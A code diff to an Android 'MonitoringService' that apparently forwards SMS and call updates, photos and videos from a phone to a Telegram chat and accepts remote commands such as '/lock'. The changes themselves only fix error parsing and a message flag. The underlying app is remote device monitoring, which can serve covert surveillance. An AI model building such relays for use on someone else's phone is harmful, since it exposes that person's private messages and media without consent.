@@ -1416,7 +1416,7 @@ class MonitoringService : Service() {
                     messageQueue.clearQueue()
                 } catch (_: Exception) {
                 }
-                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped). Note: SMS/call updates already marked as seen will not resend.", null, false)
+                sendToTelegram("\uD83D\uDDD1\uFE0F Queue cleared ($queued dropped). Note: SMS/call updates already marked as seen will not resend.", null, true)
             }
             "/lock" -> {
                 try {
@@ -3711,7 +3711,7 @@ class MonitoringService : Service() {
             }
             val errorBody = errorFull.take(200)
             if (response.code() == 429) {
-                val waitSecs = NetworkUtils.parseRetryAfter(errorBody).coerceIn(1L, 300L)
+                val waitSecs = NetworkUtils.parseRetryAfter(errorFull).coerceIn(1L, 300L)
                 mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
                 android.util.Log.w("MonitoringService", "Video rate limited, backing off ${waitSecs}s without blocking")
                 try {
@@ -3728,7 +3728,7 @@ class MonitoringService : Service() {
                 }
             } else if (response.code() == 400) {
                 if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
-                if (NetworkUtils.isChatMissing(errorBody)) {
+                if (NetworkUtils.isChatMissing(errorFull)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
@@ -3736,7 +3736,7 @@ class MonitoringService : Service() {
                     }
                     return MediaSendOutcome.KEPT
                 }
-                if (NetworkUtils.isRightsLimited(errorBody)) {
+                if (NetworkUtils.isRightsLimited(errorFull)) {
                     android.util.Log.w("MonitoringService", "Video rights limited (400), keeping file without auth block")
                     return MediaSendOutcome.KEPT
                 }
@@ -4033,7 +4033,7 @@ class MonitoringService : Service() {
             }
             val errorBody = errorFull.take(200)
             if (response.code() == 429) {
-                val waitSecs = NetworkUtils.parseRetryAfter(errorBody).coerceIn(1L, 300L)
+                val waitSecs = NetworkUtils.parseRetryAfter(errorFull).coerceIn(1L, 300L)
                 mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
                 android.util.Log.w("MonitoringService", "Photo rate limited, backing off ${waitSecs}s without blocking")
                 try {
@@ -4050,7 +4050,7 @@ class MonitoringService : Service() {
                 }
             } else if (response.code() == 400) {
                 if (adoptMigratedChat(errorFull, chatId)) return MediaSendOutcome.KEPT
-                if (NetworkUtils.isChatMissing(errorBody)) {
+                if (NetworkUtils.isChatMissing(errorFull)) {
                     try {
                         preferencesManager.credentialError = response.code().toString()
                         preferencesManager.credentialErrorAt = System.currentTimeMillis()
@@ -4058,7 +4058,7 @@ class MonitoringService : Service() {
                     }
                     return MediaSendOutcome.KEPT
                 }
-                if (NetworkUtils.isRightsLimited(errorBody)) {
+                if (NetworkUtils.isRightsLimited(errorFull)) {
                     android.util.Log.w("MonitoringService", "Photo rights limited (400), keeping file without auth block")
                     return MediaSendOutcome.KEPT
                 }
